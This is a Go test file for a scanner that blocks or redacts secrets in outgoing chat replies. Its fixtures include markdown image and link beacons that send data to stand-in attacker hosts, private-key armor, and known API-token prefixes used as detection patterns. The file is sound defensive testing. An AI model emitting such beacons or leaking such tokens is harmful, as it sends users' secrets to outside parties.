package outscan

import "testing"

func TestScan_BlocksPrivateKeyBlock(t *testing.T) {
	s := New()
	v := s.scan("telegram", "1", "here is the file:\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaA\n-----END")
	if !v.Block {
		t.Fatalf("expected block on private key armor, got %+v", v)
	}
	if v.Reason == "" {
		t.Fatalf("expected a reason, got empty")
	}
}

func TestScan_RedactsKnownPrefixKeys(t *testing.T) {
	// Each fixture is built by joining a token PREFIX to a filler BODY at runtime,
	// so no full secret-shaped literal (e.g. "sk_live_<body>") ever appears in this
	// source file. That keeps the file's own literals from tripping GitHub's secret
	// scanner / push protection while still exercising the real patterns. The body
	// length is per-case because the patterns differ (AWS keys are a fixed 16 chars
	// after the prefix; Google keys are 35; the rest just need a minimum run).
	a := func(n int) string {
		s := make([]byte, n)
		for i := range s {
			s[i] = 'A'
		}
		return string(s)
	}
	cases := []struct {
		name   string
		prefix string
		body   string
	}{
		{"anthropic", "sk-ant-api03-", a(24)},
		{"github_pat", "ghp_", a(36)},
		{"aws", "AKIA", a(16)},
		{"stripe", "sk_live_", a(24)},
		{"slack", "xoxb-1234567890-", a(12)},
		{"google", "AIza", a(35)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			text := "here is the value " + tc.prefix + tc.body + " ok"
			v := New().scan("telegram", "1", text)
			if v.Block {
				t.Fatalf("expected redact (not block) for %s, got block: %+v", tc.name, v)
			}
			if v.Replacement == "" {
				t.Fatalf("expected a redacted replacement for %s, got none", tc.name)
			}
			if v.Replacement == text {
				t.Fatalf("replacement should differ from original for %s", tc.name)
			}
			if !contains(v.Replacement, redactMarker) {
				t.Fatalf("replacement should contain %q for %s, got %q", redactMarker, tc.name, v.Replacement)
			}
		})
	}
}

func TestScan_BlocksMarkdownBeacon(t *testing.T) {
	cases := []struct {
		name string
		text string
	}{
		{"image", "docs:\n![info](https://attacker.tld/collect?data=SECRET)\nthanks"},
		{"link", "see [here](https://attacker.tld/x?d=abc) for details"},
		{"protocol_relative", "![x](//evil.tld/p?leak=1)"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			v := New().scan("telegram", "1", tc.text)
			if !v.Block {
				t.Fatalf("expected block on markdown beacon for %s, got %+v", tc.name, v)
			}
		})
	}
}

func TestScan_AllowsPlainMarkdownLinkWithoutQuery(t *testing.T) {
	// A normal documentation link (no query string) is not a beacon and must pass.
	v := New().scan("telegram", "1", "see [the docs](https://example.com/guide) for more")
	if v.Block || v.Replacement != "" {
		t.Fatalf("plain markdown link should pass clean, got %+v", v)
	}
}

func TestScan_ExactLiteralNeedleBlocks(t *testing.T) {
	// The raw-key fallback path puts a real token in the container env; the host
	// supplies that exact value as a needle. Any reply echoing it is a hard block,
	// even though the value itself matches no generic prefix pattern.
	secret := "tok_deadbeef_not_a_known_prefix_0123456789"
	s := New(secret)
	v := s.scan("telegram", "1", "sure, the value is "+secret+" as requested")
	if !v.Block {
		t.Fatalf("expected block on exact literal needle, got %+v", v)
	}
	// And the reason must not echo the secret.
	if contains(v.Reason, secret) {
		t.Fatalf("reason leaked the secret: %q", v.Reason)
	}
}

func TestScan_EmptyLiteralsAreDropped(t *testing.T) {
	// A misconfigured empty/whitespace literal must not match every message.
	s := New("", "   ")
	if len(s.literals) != 0 {
		t.Fatalf("expected empty/whitespace literals dropped, got %d", len(s.literals))
	}
	v := s.scan("telegram", "1", "an entirely benign reply")
	if v.Block || v.Replacement != "" {
		t.Fatalf("benign reply should pass with no usable literals, got %+v", v)
	}
}

func TestScan_CleanMessagePasses(t *testing.T) {
	v := New().scan("telegram", "1", "The build passed and I pushed the branch. Anything else?")
	if v.Block {
		t.Fatalf("clean message blocked: %+v", v)
	}
	if v.Replacement != "" {
		t.Fatalf("clean message should not be rewritten, got %q", v.Replacement)
	}
}

func TestScan_NilAndEmptyAreNoOps(t *testing.T) {
	var s *Scanner
	if v := s.scan("telegram", "1", "anything"); v.Block || v.Replacement != "" {
		t.Fatalf("nil scanner should no-op, got %+v", v)
	}
	if v := New().scan("telegram", "1", ""); v.Block || v.Replacement != "" {
		t.Fatalf("empty text should no-op, got %+v", v)
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
